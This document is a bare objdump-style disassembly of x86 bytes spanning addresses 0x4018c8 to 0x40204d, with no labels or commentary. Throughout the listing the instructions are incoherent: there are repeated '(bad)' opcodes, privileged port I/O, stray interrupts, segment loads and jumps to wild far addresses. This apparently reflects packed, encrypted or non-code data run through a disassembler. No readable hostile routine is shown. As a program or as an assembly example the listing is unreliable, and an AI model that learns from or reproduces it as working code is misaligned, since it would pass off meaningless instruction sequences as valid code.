  4018c8:	adc    eax,0x62846df7
  4018cd:	xchg   ebp,eax
  4018ce:	xor    DWORD PTR [ebp-0x2d17afc3],eax
  4018d4:	int    0x83
  4018d6:	and    al,0xe2
  4018d8:	test   eax,0xe29a3820
  4018dd:	xlat   BYTE PTR ds:[ebx]
  4018de:	jne    0x401926
  4018e0:	dec    ebp
  4018e1:	cmp    bh,dh
  4018e3:	pop    ds
  4018e4:	add    DWORD PTR [ebp-0x46dc37ff],0x514c69ff
  4018ee:	inc    ecx
  4018ef:	dec    ecx
  4018f0:	in     al,0xff
  4018f2:	cli    
  4018f3:	dec    ecx
  4018f4:	cdq    
  4018f5:	imul   edx,edi,0x29c6460e
  4018fb:	sahf   
  4018fc:	int    0xb1
  4018fe:	jmp    esi
  401900:	inc    esp
  401901:	lds    esi,FWORD PTR [ebp+0x15]
  401904:	cmp    eax,DWORD PTR ds:0x2125d99c
  40190b:	jns    0x40194d
  40190d:	push   ebp
  40190e:	push   ss
  40190f:	and    ah,BYTE PTR [ebp+0x503ad459]
  401915:	push   bx
  401917:	cli    
  401918:	xchg   ebp,eax
  401919:	sub    edi,DWORD PTR [edx]
  40191b:	push   edi
  40191c:	sbb    bh,bl
  40191e:	adc    DWORD PTR [eax-0x460af6aa],0x8ac43d1
  401928:	(bad)  
  40192a:	popf   
  40192b:	mov    esi,0x3d601024
  401930:	xor    eax,0xbcf76adb
  401935:	push   eax
  401936:	aas    
  401937:	(bad)  
  401938:	cld    
  401939:	jbe    0x40196a
  40193b:	jo     0x4019a3
  40193d:	xchg   edx,eax
  40193e:	(bad)  
  40193f:	mov    ecx,0xfdfaffab
  401944:	pop    ds
  401945:	data16 gs sti 
  401948:	sar    edi,1
  40194a:	jo     0x40194e
  40194c:	or     BYTE PTR [esi+eiz*2-0x3bd6e5f4],ch
  401953:	inc    ebp
  401954:	jmp    0x4019c2
  401956:	outs   dx,DWORD PTR ds:[esi]
  401957:	dec    ebx
  401958:	lds    eax,FWORD PTR [esi]
  40195a:	je     0x401927
  40195c:	xchg   ecx,eax
  40195d:	xchg   ebp,eax
  40195e:	nop
  40195f:	mov    ds:0xdf80ed1b,eax
  401964:	repz mov dh,0x54
  401967:	xor    ecx,DWORD PTR [eax-0xc]
  40196a:	xchg   esi,eax
  40196b:	(bad)  
  40196c:	mov    ebx,0x6d9a1410
  401971:	stos   DWORD PTR es:[edi],eax
  401972:	push   DWORD PTR ds:0x7ae759a8
  401978:	dec    esi
  401979:	in     al,dx
  40197a:	sub    eax,0xbe1e9c6b
  40197f:	in     al,0x6d
  401981:	stos   BYTE PTR es:[edi],al
  401982:	mov    cl,0x9b
  401984:	mov    esi,0xc0e49f7b
  401989:	dec    ebp
  40198a:	and    al,BYTE PTR [esi+0x2a]
  40198d:	inc    edi
  40198e:	lock lea edi,[ebp+0x6]
  401992:	retf   
  401993:	inc    ebx
  401994:	dec    esi
  401995:	(bad)  
  401997:	or     DWORD PTR [ebp+0x34],0x8c4289fc
  40199e:	lods   eax,DWORD PTR ds:[esi]
  40199f:	sbb    al,0xb4
  4019a1:	dec    eax
  4019a2:	adc    al,0xd7
  4019a4:	mov    cl,0xd2
  4019a6:	push   esi
  4019a7:	lods   eax,DWORD PTR ds:[esi]
  4019a8:	xor    BYTE PTR [ebx-0x16363e4b],ch
  4019ae:	in     eax,dx
  4019af:	pop    edx
  4019b0:	cmp    eax,0xb7820131
  4019b5:	mov    bl,0xab
  4019b7:	pop    esp
  4019b8:	xchg   BYTE PTR [edi-0x534cb615],ch
  4019be:	in     eax,dx
  4019bf:	imul   esp,DWORD PTR [eax],0xffffffa3
  4019c2:	xchg   ebx,eax
  4019c3:	mov    ch,0x67
  4019c5:	fisubr WORD PTR [ecx+0x52]
  4019c8:	or     ebp,DWORD PTR [ecx-0x3d06803c]
  4019ce:	jns    0x401a19
  4019d0:	cmp    al,0xe8
  4019d2:	push   esp
  4019d3:	xchg   ebp,eax
  4019d4:	ret    0x1a9a
  4019d7:	sbb    cl,BYTE PTR [edi+edx*4-0xa]
  4019db:	jno    0x4019c3
  4019dd:	sub    al,0x7d
  4019df:	sbb    DWORD PTR [ecx-0x7265c5ca],edx
  4019e5:	icebp  
  4019e6:	mov    BYTE PTR [edx],ah
  4019e8:	push   esi
  4019e9:	mov    edx,0xad0d90ce
  4019ee:	mov    al,ds:0xce2109d8
  4019f3:	mov    edi,0xcf79ce8d
  4019f8:	pusha  
  4019f9:	or     bl,BYTE PTR [edx-0x6ebe6f4e]
  4019ff:	adc    al,BYTE PTR [edx+edx*4-0x26]
  401a03:	test   eax,0x9bc88dbc
  401a08:	fldenv [edi]
  401a0a:	add    al,0x55
  401a0c:	fstp   DWORD PTR [ecx]
  401a0e:	test   al,0x5
  401a10:	repnz cli 
  401a12:	cmp    DWORD PTR [eax],ecx
  401a14:	xor    eax,0xe4dd7396
  401a19:	ja     0x401a68
  401a1b:	or     al,0x25
  401a1d:	add    DWORD PTR [esi-0x42],edx
  401a20:	inc    eax
  401a21:	or     ebx,edi
  401a23:	push   ebp
  401a24:	jecxz  0x401a43
  401a26:	add    al,0x75
  401a28:	and    BYTE PTR [esi+0x2f],0x42
  401a2c:	add    eax,0xd1d0a1eb
  401a31:	xchg   ebp,eax
  401a32:	xor    al,0x3d
  401a34:	dec    esi
  401a35:	push   edx
  401a36:	jb     0x401a0a
  401a38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a39:	mov    ah,0xef
  401a3b:	adc    esi,DWORD PTR [esi-0x27df2ad1]
  401a41:	bound  esp,QWORD PTR [ecx-0x161eaa8f]
  401a47:	xchg   esi,eax
  401a48:	inc    ecx
  401a49:	pop    ds
  401a4a:	sbb    ah,BYTE PTR [ebx]
  401a4c:	les    esi,FWORD PTR [esi]
  401a4e:	mov    BYTE PTR [esp+ebp*2],ah
  401a51:	not    DWORD PTR [esi-0x7]
  401a54:	cli    
  401a55:	aaa    
  401a56:	add    eax,DWORD PTR ds:0xabad0911
  401a5c:	popa   
  401a5d:	adc    edx,DWORD PTR [edi-0x4dde06f8]
  401a63:	push   ebp
  401a64:	mov    WORD PTR [ecx+0x16770bae],ds
  401a6a:	jno    0x4019f1
  401a6c:	dec    ebx
  401a6d:	les    eax,FWORD PTR [ebp+edi*1-0x3aa3649d]
  401a74:	sbb    al,0xdc
  401a76:	mov    eax,ds:0x7a78da57
  401a7b:	rol    BYTE PTR [eax+ebx*2+0x6fae5596],1
  401a82:	pushf  
  401a83:	scas   eax,DWORD PTR es:[edi]
  401a84:	ja     0x401a75
  401a86:	pop    ecx
  401a87:	mov    edi,0x8267a87d
  401a8c:	arpl   WORD PTR [esi-0x4037efd9],bp
  401a92:	dec    esp
  401a93:	adc    al,0x61
  401a95:	shl    BYTE PTR [eax-0x1d1e79fd],cl
  401a9b:	adc    DWORD PTR [ecx-0x5d5bddc6],ecx
  401aa1:	std    
  401aa2:	enter  0xa6d1,0x8f
  401aa6:	mov    ds,WORD PTR [eax-0x26]
  401aa9:	pushf  
  401aaa:	dec    esp
  401aab:	inc    ebx
  401aac:	sub    DWORD PTR [eax],esp
  401aae:	lds    esp,FWORD PTR [esi+0x53ad3b46]
  401ab4:	cdq    
  401ab5:	les    edx,FWORD PTR [ebx]
  401ab7:	push   ebp
  401ab8:	push   ss
  401ab9:	push   esi
  401aba:	adc    al,0xd0
  401abc:	mov    esp,0xa3dc9909
  401ac1:	int    0x3b
  401ac3:	cmp    ecx,DWORD PTR [ebx-0x74710343]
  401ac9:	shl    esp,0xc8
  401acc:	inc    ecx
  401acd:	shl    DWORD PTR [ebx-0x28],1
  401ad0:	int    0x73
  401ad2:	sub    esp,DWORD PTR [ebx-0x6f]
  401ad5:	repz jno 0x401ae4
  401ad8:	mov    eax,0xd0252289
  401add:	mov    dh,0xe
  401adf:	mov    edx,0x3ed7d958
  401ae4:	mov    esi,0x67158be2
  401ae9:	gs scas eax,DWORD PTR es:[edi]
  401aeb:	outs   dx,DWORD PTR ds:[esi]
  401aec:	pop    ecx
  401aed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401aee:	(bad)  
  401af0:	xchg   ebx,eax
  401af1:	add    ecx,DWORD PTR [edx+0x20bc2af3]
  401af7:	inc    esi
  401af8:	aad    0xc4
  401afa:	jmp    0xa499e9d5
  401aff:	(bad)  
  401b00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b01:	dec    esi
  401b02:	cli    
  401b03:	push   edx
  401b04:	jp     0x401b5d
  401b06:	push   0xb9423837
  401b0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b0c:	in     eax,0x52
  401b0e:	fnstenv [esp+ecx*1-0x7d91d96f]
  401b15:	in     eax,dx
  401b16:	push   es
  401b17:	leave  
  401b18:	sbb    esp,esp
  401b1a:	rcl    BYTE PTR [ecx],cl
  401b1c:	inc    esi
  401b1d:	jmp    0x401ae3
  401b1f:	shr    DWORD PTR [ecx+edi*1+0x5fc3fd82],cl
  401b26:	mov    ah,0x4d
  401b28:	retf   0xbe16
  401b2b:	dec    eax
  401b2c:	add    ecx,DWORD PTR [edx-0x48]
  401b2f:	shl    DWORD PTR [edx-0x60],cl
  401b32:	xchg   BYTE PTR [edi],dh
  401b34:	sti    
  401b35:	and    DWORD PTR [esi+eax*1],esp
  401b38:	scas   al,BYTE PTR es:[edi]
  401b39:	adc    BYTE PTR [ebp+edx*1+0x8978089],dh
  401b40:	ret    0x7fae
  401b43:	shl    DWORD PTR [eax+0x21],cl
  401b46:	pop    edx
  401b47:	shl    DWORD PTR ds:0x5fb1c98,cl
  401b4d:	pushf  
  401b4e:	or     DWORD PTR [ecx],ebp
  401b50:	rol    BYTE PTR [esi-0x79],0x84
  401b54:	pop    ebp
  401b55:	ss sub eax,0xb1eef55e
  401b5b:	push   esi
  401b5c:	jp     0x401b27
  401b5e:	into   
  401b5f:	xchg   edx,eax
  401b60:	jl     0x401bae
  401b62:	pop    esi
  401b63:	mov    esi,esp
  401b65:	cwde   
  401b66:	adc    al,0x77
  401b68:	xor    edi,DWORD PTR [edi]
  401b6a:	ficom  WORD PTR [esi+0x5aa39238]
  401b70:	ss push ebx
  401b72:	aas    
  401b73:	stos   DWORD PTR es:[edi],eax
  401b74:	sbb    eax,0x9b3d5d35
  401b79:	xchg   edx,eax
  401b7a:	inc    edi
  401b7b:	call   0xece3:0xc109cda
  401b82:	into   
  401b83:	arpl   WORD PTR [edx],dx
  401b85:	mov    esp,0xbb2ab04
  401b8a:	jmp    0xd55b4314
  401b8f:	jo     0x401b39
  401b91:	lods   eax,DWORD PTR ds:[esi]
  401b92:	cmp    DWORD PTR [esi+0x2c],0x7d828bc7
  401b99:	or     edi,ebx
  401b9b:	pop    edx
  401b9c:	push   cs
  401b9d:	test   al,0xbe
  401b9f:	stos   DWORD PTR es:[edi],eax
  401ba0:	cmp    al,0x75
  401ba2:	outs   dx,BYTE PTR ds:[esi]
  401ba3:	fcmovb st,st(1)
  401ba5:	scas   al,BYTE PTR es:[edi]
  401ba6:	loop   0x401b8b
  401ba8:	cwde   
  401ba9:	ins    BYTE PTR es:[edi],dx
  401baa:	fidiv  DWORD PTR [eax]
  401bac:	and    ah,BYTE PTR [edi-0x2d]
  401baf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bb0:	ror    eax,1
  401bb2:	and    eax,0xa5e77b74
  401bb7:	push   ebp
  401bb8:	mov    eax,ss
  401bba:	in     al,0xb3
  401bbc:	push   edi
  401bbd:	loope  0x401bbf
  401bbf:	inc    esp
  401bc0:	aam    0x18
  401bc2:	jnp    0x401bdc
  401bc4:	outs   dx,BYTE PTR ds:[esi]
  401bc5:	pop    edx
  401bc6:	mov    esp,0x55b42c61
  401bcb:	or     al,0x6c
  401bcd:	cmp    al,0x73
  401bcf:	popa   
  401bd0:	sbb    eax,0x9de60f71
  401bd5:	aad    0x6
  401bd7:	push   ebp
  401bd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bd9:	call   0x5cdc9d21
  401bde:	mov    eax,0xf4f596b3
  401be3:	cmp    DWORD PTR [eax],ecx
  401be5:	push   esi
  401be6:	sbb    dh,BYTE PTR [ebp+0x30]
  401be9:	xchg   ebx,eax
  401bea:	js     0x401c48
  401bec:	mov    eax,ds:0x7ab1a444
  401bf1:	pop    ds
  401bf2:	jne    0x401bfb
  401bf4:	push   ebp
  401bf5:	cmc    
  401bf6:	sbb    DWORD PTR [edi],0x6ec506db
  401bfc:	xlat   BYTE PTR ds:[ebx]
  401bfd:	aad    0xe3
  401bff:	sbb    BYTE PTR [eax],0x57
  401c02:	fist   WORD PTR [ebx-0x7f06aa50]
  401c08:	mov    al,BYTE PTR [edi-0x3f7b820d]
  401c0e:	push   ebx
  401c0f:	and    BYTE PTR [ecx-0x1be382db],ah
  401c15:	dec    ebx
  401c16:	fisttp QWORD PTR [esi-0xd]
  401c19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c1a:	xor    al,0x80
  401c1c:	enter  0x98c7,0x59
  401c20:	jmp    0x8d04a5f1
  401c25:	sbb    ch,bl
  401c27:	xchg   esi,eax
  401c28:	mov    ebx,fs
  401c2a:	dec    ecx
  401c2b:	jl     0x401bc4
  401c2d:	mov    ds:0x9af9c930,al
  401c32:	imul   eax,esp,0xe1ade563
  401c38:	jmp    0x401c93
  401c3a:	repnz mov ebx,0x951668e
  401c40:	pop    ecx
  401c41:	cmp    al,0x15
  401c43:	retf   0xc372
  401c46:	mov    ds:0x6f200dd7,al
  401c4b:	adc    edi,DWORD PTR [edx]
  401c4d:	xchg   esp,eax
  401c4e:	cld    
  401c4f:	jmp    FWORD PTR [edi]
  401c51:	inc    esp
  401c52:	and    BYTE PTR [edx+eax*2],0x98
  401c56:	sub    dl,dl
  401c58:	shl    dl,1
  401c5a:	xlat   BYTE PTR ds:[ebx]
  401c5b:	test   eax,0xc070dd3c
  401c60:	enter  0x91f8,0x38
  401c64:	pop    esi
  401c65:	(bad)  
  401c66:	push   eax
  401c67:	arpl   WORD PTR [esi-0x3016e53a],dx
  401c6d:	jae    0x401c8f
  401c6f:	pop    ds
  401c70:	xchg   ebx,eax
  401c71:	(bad)  
  401c72:	in     al,dx
  401c73:	in     al,dx
  401c74:	mov    edx,0xa63588fe
  401c79:	sub    DWORD PTR [esi+0x5bf78fd8],edi
  401c7f:	fdiv   st,st(1)
  401c81:	(bad)  
  401c82:	hlt    
  401c83:	or     BYTE PTR [ecx-0x4410b6dc],0x36
  401c8a:	ret    
  401c8b:	pop    ebx
  401c8c:	in     al,0x5b
  401c8e:	fcomp  DWORD PTR [eax+0x1]
  401c91:	jbe    0x401c53
  401c93:	fstp   TBYTE PTR [edx-0x7a559685]
  401c99:	xchg   edi,eax
  401c9a:	test   al,0xf
  401c9c:	jb     0x401cc6
  401c9e:	fs sahf 
  401ca0:	mov    edx,0x91e4dc40
  401ca5:	xchg   ebp,eax
  401ca6:	inc    ebx
  401ca7:	(bad)  [ecx]
  401ca9:	dec    esp
  401caa:	xchg   esi,eax
  401cab:	adc    eax,0x2661d7bc
  401cb0:	retf   
  401cb1:	pop    ecx
  401cb2:	dec    edx
  401cb3:	pop    edi
  401cb4:	jmp    DWORD PTR [ecx+0x31]
  401cb7:	jl     0x401c5a
  401cb9:	inc    ebp
  401cba:	xchg   ebx,eax
  401cbb:	jb     0x401ce9
  401cbd:	lods   eax,DWORD PTR ds:[esi]
  401cbe:	mov    es,WORD PTR [ecx-0x43]
  401cc1:	daa    
  401cc2:	mov    ecx,0xf577de39
  401cc7:	push   edx
  401cc8:	mov    BYTE PTR [ebx+0xa],dh
  401ccb:	jl     0x401cae
  401ccd:	or     eax,0xf0f6ccb5
  401cd2:	inc    eax
  401cd3:	push   eax
  401cd4:	rcl    DWORD PTR [ebx+0x4b742143],1
  401cda:	xchg   BYTE PTR [ebp-0x5d],ah
  401cdd:	and    al,0x53
  401cdf:	sbb    al,0x20
  401ce1:	mov    ebx,0xbae58f7
  401ce6:	sub    DWORD PTR [ecx+0xd],edi
  401ce9:	or     ebp,esp
  401ceb:	(bad)
  401cf0:	loope  0x401cd8
  401cf2:	and    bh,BYTE PTR [eax+ecx*4-0xcffd441]
  401cf9:	out    0x10,eax
  401cfb:	es (bad) 
  401cfd:	shl    edx,cl
  401cff:	fnsave [eax-0xc]
  401d02:	mov    eax,0x6d793c5f
  401d07:	xchg   esi,eax
  401d08:	xor    eax,0x9c5333cd
  401d0d:	push   ebx
  401d0e:	les    edx,FWORD PTR [eax+eax*1-0x1fd68207]
  401d15:	adc    BYTE PTR [eax],ah
  401d17:	dec    ebx
  401d18:	inc    edx
  401d19:	xor    ebx,edi
  401d1b:	(bad)  
  401d1c:	fistp  QWORD PTR [edx+0x11]
  401d1f:	mov    DWORD PTR [esi],edi
  401d21:	dec    esp
  401d22:	jbe    0x401cf1
  401d24:	lea    ecx,[esi]
  401d26:	xchg   ecx,eax
  401d27:	mov    al,ds:0x30c86a5d
  401d2c:	daa    
  401d2d:	out    dx,al
  401d2e:	inc    edi
  401d2f:	jle    0x401d89
  401d31:	mov    DWORD PTR [ebp-0x2b],esp
  401d34:	mov    ch,0xd0
  401d36:	sub    BYTE PTR [ecx],bh
  401d38:	(bad)  
  401d39:	pop    ss
  401d3a:	mov    BYTE PTR [edx+0x3452ec0f],al
  401d40:	or     eax,0xce0037b2
  401d45:	fidivr DWORD PTR [ebp-0x5c]
  401d48:	xor    eax,0xc6506aba
  401d4d:	add    eax,0x839318c1
  401d52:	fdivr  QWORD PTR [edi-0x1d]
  401d55:	dec    esi
  401d56:	mov    bh,BYTE PTR [esi+0xc]
  401d59:	xor    DWORD PTR [edi],edi
  401d5b:	pop    esi
  401d5c:	(bad)  [ecx+0x31885a78]
  401d62:	imul   edx,DWORD PTR [ebx-0x7fdf6190],0x3f
  401d69:	bnd js 0x401dc0
  401d6c:	mov    BYTE PTR [ebp+0x67],bh
  401d6f:	ret    0x8c57
  401d72:	xor    BYTE PTR [eax-0x2e],cl
  401d75:	js     0x401dc1
  401d77:	lock in al,0x2a
  401d7a:	xchg   edx,eax
  401d7b:	mov    cl,0x6d
  401d7d:	(bad)  
  401d7e:	sub    dh,BYTE PTR [ebx+eiz*4+0x10]
  401d82:	inc    esi
  401d83:	arpl   WORD PTR [edi],dx
  401d85:	adc    ebx,ebp
  401d87:	mov    es,ebx
  401d89:	in     al,dx
  401d8a:	mov    bl,0x7b
  401d8c:	dec    esp
  401d8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d8e:	enter  0x9047,0x9c
  401d92:	and    eax,0xb8c315f5
  401d97:	sbb    al,0xb3
  401d99:	pushf  
  401d9a:	mov    esi,0x978dfbd9
  401d9f:	pop    edx
  401da0:	icebp  
  401da1:	sbb    dl,bh
  401da3:	xchg   esi,eax
  401da4:	rol    DWORD PTR [edi],cl
  401da6:	mov    cl,0xa7
  401da8:	shl    DWORD PTR [edi+0x140f7df0],0x6
  401daf:	fisttp QWORD PTR [edi+0x1858f877]
  401db5:	cwde   
  401db6:	jbe    0x401ddd
  401db8:	fisttp WORD PTR [ebp+0x2984b4f9]
  401dbe:	inc    ebp
  401dbf:	pop    es
  401dc0:	loop   0x401dba
  401dc2:	push   ss
  401dc3:	and    ebp,DWORD PTR [ebp-0x26]
  401dc6:	and    eax,0x7f58a9a8
  401dcb:	inc    edx
  401dcc:	pop    ebp
  401dcd:	pop    esi
  401dce:	loop   0x401e24
  401dd0:	fucom  st(6)
  401dd2:	sub    cl,BYTE PTR [ebx+0x30]
  401dd5:	imul   esi,DWORD PTR [ebx+edx*2-0x60],0x358316ca
  401ddd:	test   edx,ebp
  401ddf:	jb     0x401e09
  401de1:	rcr    BYTE PTR [edi+esi*4+0x11],0x34
  401de6:	rcr    DWORD PTR [edx],cl
  401de8:	cmp    esp,ecx
  401dea:	adc    eax,0xb3354a31
  401def:	aad    0xe7
  401df1:	pop    ss
  401df2:	push   edx
  401df3:	jmp    0x401e5e
  401df5:	jb     0x401da5
  401df7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401df8:	gs out dx,al
  401dfa:	cwde   
  401dfb:	dec    ecx
  401dfc:	int    0xfa
  401dfe:	and    al,0x1b
  401e00:	sub    al,0x1f
  401e02:	cli    
  401e03:	mov    ah,0x20
  401e05:	outs   dx,BYTE PTR ds:[esi]
  401e06:	push   ecx
  401e07:	push   es
  401e08:	mov    DWORD PTR [esi],ebx
  401e0a:	scas   al,BYTE PTR es:[edi]
  401e0b:	xchg   ebp,eax
  401e0c:	shl    BYTE PTR [esi+0x8e381c3],cl
  401e12:	test   al,0x5f
  401e14:	inc    eax
  401e15:	add    al,0x45
  401e17:	push   eax
  401e18:	xor    ecx,ebx
  401e1a:	or     DWORD PTR [ebx+0x72],0xffffffc0
  401e1e:	icebp  
  401e1f:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  401e21:	pop    esi
  401e22:	push   0x3b
  401e24:	pop    es
  401e25:	stos   DWORD PTR es:[edi],eax
  401e26:	mov    ebx,0xf8572f73
  401e2b:	repz retf 0x43cf
  401e2f:	adc    ecx,edi
  401e31:	test   eax,0x582c0138
  401e36:	pop    edx
  401e37:	push   edi
  401e38:	add    cl,BYTE PTR [ecx+0x44]
  401e3b:	fldln2 
  401e3d:	xor    al,0x7b
  401e3f:	xchg   ebp,eax
  401e40:	sti    
  401e41:	dec    edx
  401e42:	cmp    ebp,eax
  401e44:	shl    al,0xed
  401e47:	stos   BYTE PTR es:[edi],al
  401e48:	retf   
  401e49:	out    dx,al
  401e4a:	sbb    dh,BYTE PTR [ebp+0x5c]
  401e4d:	and    al,BYTE PTR [esi]
  401e4f:	xor    eax,0xcb53a551
  401e54:	jge    0x401ddd
  401e56:	in     al,0x86
  401e58:	nop
  401e59:	xor    DWORD PTR [esi-0x5ea547ac],esp
  401e5f:	pop    ecx
  401e60:	daa    
  401e61:	ins    BYTE PTR es:[edi],dx
  401e62:	mov    DWORD PTR gs:[esi+0xe],edx
  401e66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e67:	outs   dx,BYTE PTR ds:[esi]
  401e68:	jo     0x401e35
  401e6a:	jge    0x401ed0
  401e6c:	outs   dx,DWORD PTR ds:[esi]
  401e6d:	or     eax,0x581ab35d
  401e72:	or     cl,BYTE PTR [ecx-0x3e]
  401e75:	and    al,0x9c
  401e77:	(bad)  
  401e78:	or     BYTE PTR [ecx],ah
  401e7a:	xor    BYTE PTR [edx+0x43b27779],bl
  401e80:	das    
  401e81:	pop    ss
  401e82:	lds    edi,FWORD PTR [edx+eax*2]
  401e85:	xor    cl,BYTE PTR [edi+0x41]
  401e88:	sub    dh,BYTE PTR fs:[edx+0x401a6612]
  401e8f:	add    BYTE PTR [eax],0x8a
  401e92:	mov    ch,0x89
  401e94:	pop    ds
  401e95:	inc    ecx
  401e96:	or     eax,0xbe0fb9c4
  401e9b:	push   es
  401e9c:	push   0x65
  401e9e:	pop    ebx
  401e9f:	and    BYTE PTR [edx-0x254f738],al
  401ea5:	cmp    ebp,DWORD PTR [ebx+0x2ca8f3d4]
  401eab:	popf   
  401eac:	sbb    al,BYTE PTR ds:0xfaf67820
  401eb2:	popa   
  401eb3:	cld    
  401eb4:	adc    DWORD PTR [edx],ecx
  401eb6:	pop    ecx
  401eb7:	bound  esi,QWORD PTR [edi]
  401eb9:	cmp    BYTE PTR [esi],ch
  401ebb:	mov    edx,0x1323a7e0
  401ec0:	jmp    0x7b5b2e73
  401ec5:	xlat   BYTE PTR ds:[ebx]
  401ec6:	inc    ebx
  401ec7:	inc    edi
  401ec8:	out    dx,eax
  401ec9:	add    DWORD PTR [ebx-0x17],ebp
  401ecc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ecd:	jne    0x401f0d
  401ecf:	clc    
  401ed0:	(bad)  
  401ed1:	xor    DWORD PTR [ecx],ebp
  401ed3:	jecxz  0x401e8d
  401ed5:	inc    eax
  401ed6:	cmp    ecx,DWORD PTR [edi+ebx*1]
  401ed9:	ins    BYTE PTR es:[edi],dx
  401eda:	xor    BYTE PTR [eax-0x30d19087],bl
  401ee0:	and    cl,ch
  401ee2:	add    BYTE PTR [edx+0x33],cl
  401ee5:	pusha  
  401ee6:	and    dl,al
  401ee8:	add    eax,0xe32f4a55
  401eed:	daa    
  401eee:	sbb    eax,0xdf25fa9d
  401ef3:	scas   al,BYTE PTR es:[edi]
  401ef4:	dec    edx
  401ef5:	jbe    0x401ec7
  401ef7:	(bad)
  401efa:	dec    ebp
  401efb:	fstp   st(4)
  401efd:	scas   al,BYTE PTR es:[edi]
  401efe:	inc    eax
  401eff:	pushf  
  401f00:	sbb    ebp,DWORD PTR [edi-0x9]
  401f03:	fwait
  401f04:	ss dec esi
  401f07:	mov    esp,0x817cb49d
  401f0c:	(bad)  
  401f0d:	(bad)  
  401f0e:	fstp   TBYTE PTR [ebp+0x4affae19]
  401f14:	add    eax,0x38b2ed6c
  401f19:	aad    0x70
  401f1b:	xchg   edi,eax
  401f1c:	sti    
  401f1d:	repnz imul ebx,DWORD PTR [ecx],0x74
  401f21:	mov    ebp,0x6cb22dd4
  401f26:	mov    bl,0x61
  401f28:	inc    ebp
  401f29:	loop   0x401ed3
  401f2b:	bound  esi,QWORD PTR [edi]
  401f2d:	and    al,0xa1
  401f2f:	test   al,0xf2
  401f31:	add    bl,BYTE PTR [edx-0x32]
  401f34:	jmp    0x5ab8:0x65245ff4
  401f3b:	pop    es
  401f3c:	sub    ch,bl
  401f3e:	cmp    eax,0xc469ec7b
  401f43:	in     al,dx
  401f44:	ret    
  401f45:	stc    
  401f46:	add    al,0x19
  401f48:	cld    
  401f49:	call   0xa80d28b0
  401f4e:	mov    eax,ds:0x9580ae52
  401f53:	jge    0x401f40
  401f55:	pop    edx
  401f56:	sub    DWORD PTR [ebp+0x2f],edi
  401f59:	inc    edi
  401f5a:	and    ax,0xdea9
  401f5e:	je     0x401f72
  401f60:	cmp    al,0xb3
  401f62:	std    
  401f63:	add    ebp,0xfcb1afe6
  401f69:	nop
  401f6a:	lahf   
  401f6b:	sbb    BYTE PTR [ecx],ch
  401f6d:	xchg   esi,eax
  401f6e:	sub    ecx,esi
  401f70:	cmp    al,0xcd
  401f72:	iret   
  401f73:	mov    ebp,DWORD PTR [ecx-0x64]
  401f76:	xor    DWORD PTR [esp+eiz*4+0x4ecd5b8f],0x7ae63d7d
  401f81:	clc    
  401f82:	xchg   edx,eax
  401f83:	cmp    eax,0x3651f457
  401f88:	les    esp,FWORD PTR [ebx+0x4d10ea43]
  401f8e:	pop    edx
  401f8f:	bound  ebx,QWORD PTR [esi+0x34]
  401f92:	or     al,0xff
  401f94:	xchg   dl,dl
  401f96:	shl    DWORD PTR [ecx],1
  401f98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f99:	icebp  
  401f9a:	xchg   BYTE PTR [eax-0x43685116],dl
  401fa0:	test   BYTE PTR [edi],0x8d
  401fa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fa4:	aaa    
  401fa5:	inc    ebx
  401fa6:	xchg   ebp,eax
  401fa7:	push   ds
  401fa8:	fidiv  WORD PTR [ebp-0x4b6e2628]
  401fae:	leave  
  401faf:	fsub   st(3),st
  401fb1:	sub    bh,BYTE PTR [ebx]
  401fb3:	fbld   TBYTE PTR [esi]
  401fb5:	push   esi
  401fb6:	fistp  QWORD PTR [edx+0x57]
  401fb9:	mov    esp,0x1cf87186
  401fbe:	mov    dh,0x88
  401fc0:	test   DWORD PTR [esp+esi*8+0x56],eax
  401fc4:	jnp    0x401fe3
  401fc6:	jne    0x40202c
  401fc8:	pop    ss
  401fc9:	push   ss
  401fca:	not    BYTE PTR [ebx-0x76bf9a6c]
  401fd0:	sbb    eax,0xd49bbd6c
  401fd5:	sub    ebp,DWORD PTR [edx]
  401fd7:	sbb    eax,0xe3de1ea4
  401fdc:	and    BYTE PTR [ebx+0x2f],ch
  401fdf:	sub    esp,DWORD PTR [edx+ecx*2]
  401fe2:	into   
  401fe3:	sbb    BYTE PTR [esi+eax*8+0x5e16ff4a],dh
  401fea:	push   0xffffffa2
  401fec:	ins    DWORD PTR es:[edi],dx
  401fed:	dec    ecx
  401fee:	std    
  401fef:	ins    BYTE PTR es:[edi],dx
  401ff0:	push   eax
  401ff1:	cmp    al,0x7e
  401ff3:	push   0xffffff87
  401ff5:	and    eax,0x75a56da0
  401ffa:	pop    es
  401ffb:	add    DWORD PTR es:[edx-0x20faa6d7],ebx
  402002:	test   BYTE PTR [eax+ecx*1],0x25
  402006:	ss js  0x402047
  402009:	add    DWORD PTR [ebx+0x7d],esp
  40200c:	pusha  
  40200d:	loop   0x401fdc
  40200f:	push   esp
  402010:	jbe    0xf2d1b4b6
  402016:	push   esi
  402017:	in     al,0x4f
  402019:	cli    
  40201a:	mov    al,ds:0xa46367d
  40201f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402020:	xchg   ebx,eax
  402021:	cmp    ebp,0xffffff9a
  402024:	loope  0x401ffe
  402026:	jecxz  0x402003
  402028:	mov    esi,0xcaaa673f
  40202d:	push   ebp
  40202e:	addr16 aas 
  402030:	int    0xc7
  402032:	cmp    cl,cl
  402034:	xor    ah,bh
  402036:	xchg   esp,eax
  402037:	adc    edi,DWORD PTR [edx]
  402039:	hlt    
  40203a:	or     bh,BYTE PTR [ecx-0x40]
  40203d:	mov    dl,0x1b
  40203f:	pop    ecx
  402040:	out    dx,al
  402041:	mov    ebx,0x9bf8c957
  402046:	repz rol edi,0xf0
  40204a:	mov    al,0x5d
  40204c:	pushf  
  40204d:	add    eax,0x7838c12d
